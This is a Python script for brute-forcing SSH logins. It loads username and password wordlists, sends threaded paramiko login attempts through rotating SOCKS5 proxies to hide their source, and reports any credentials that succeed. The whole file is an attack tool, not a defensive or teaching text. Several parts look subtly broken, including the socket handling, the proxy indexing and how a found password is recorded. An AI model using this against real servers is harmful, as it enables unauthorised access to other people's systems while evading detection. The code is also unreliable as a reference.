import paramiko
import socks
import threading
import time
import sys

class ssh_brute_force:
    def __init__(self,ip='192.168.1.33',port=22,users='USERS.txt',passes='PASSES.txt',proxies=[['ip1','port1'],['ip2','port2']],threads=30):
        self.__ip = ip
        self.__port = port
        self.__number_of_threads = threads
        self.__socks = proxies
        self.__users = []
        self.__passes = []
        self.__found = False
        self.__window = []
        self.__found_username = ''
        self.__found_password = ''
        self.__read_users_passes(users,passes)
        self.__initialize_socks()
    def __print(self,message,type="n"):
        """message:        => string message
        
        mtype:      "n" => normal
                    "e" => error
                    "w" => warning  
        some_stuff: 
                    can be anyting, like object, string, number etc ... 
        """
        W = '\033[0m'
        R = '\033[31m'
        G = '\033[32m'
        O = '\033[33m'
        P = '\033[35m'
        BOLD = '\033[1m'
        THIN = '\033[1m'
        if type == "n":
            print(BOLD+P+'[ '+G+'+'+P+' ] '+O+message+THIN)
        elif type == "e":
            print(BOLD+P+'[ '+R+'!'+P+' ] '+O+message+THIN)
        elif type == "w":
            print(BOLD+P+'[ '+R+'?'+P+' ] '+O+message+THIN)
        else:
            print(BOLD+P+'[ '+W+'+'+P+' ] '+O+message+THIN)
    def __initialize_socks(self):
        #for p_ip in ['192.168.1.33','192.168.1.34','192.168.1.35']:
        #    for i in range(9050,9061):
        #        self.__socks.append([p_ip,i])
        pass
    def __read_users_passes(self,users,passes):
        self.__print('Reading usernames and passwords files ...')
        us = []
        ps = []
        try:
            f = open(users,'r')
            us = f.read().split('\n')
            f.close()
        except:
            self.__print('Unable to read '+users,'e')
            sys.exit(1)
        try:
            f = open(passes,'r')
            ps = f.read().split('\n')
            f.close()
        except:
            self.__print('Unable to read '+passes,'e')
            sys.exit(1)
        self.__users,self.__passes = us,ps  
    def __connect(self,username='',password='',socks_proxy=[]):
        sock=socks.socksocket()
        sock.set_proxy(
            proxy_type=socks.SOCKS5,
            addr=socks_proxy[0],
            port=socks_proxy[1]
        )
        try:
            sock.connect((self.__ip,self.__port))
            self.__print('Connect to '+self.__ip+':'+str(self.__port)+' using '+socks_proxy[0]+':'+str(socks_proxy[1])+'. Trying Username='+username+' , Password='+password+' ...')
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect('ignored without host key verification',username=username,password=password)
            self.__found = True
        except:
            self.__window.remove([username,password])
    def RUN(self):
        i,j,k = 0,0,0
        while True:
            while len(self.__window) >= self.__number_of_threads:
                time.sleep(1)
            self.__window.append([self.__users[i],self.__passes[j]])
            t = threading.Thread(target=self.__connect,args=(self.__users[i],self.__passes[j],self.__socks[k]))
            t.start()
            k += 1
            if k != 0 and k % 30 == 0:
                k = 0
            if self.__found:
                self.__found_username = self.__users[i]
                self.__found_password = self.__passes[j]
                break
            j += 1
            if j >= len(self.__passes):
                i += 1
                j = 0
        if self.__found:
            self.__print('Successfully found username and password.')
            self.__print('Username: '+self.__found_username+' Password: '+self.__found_password)
    
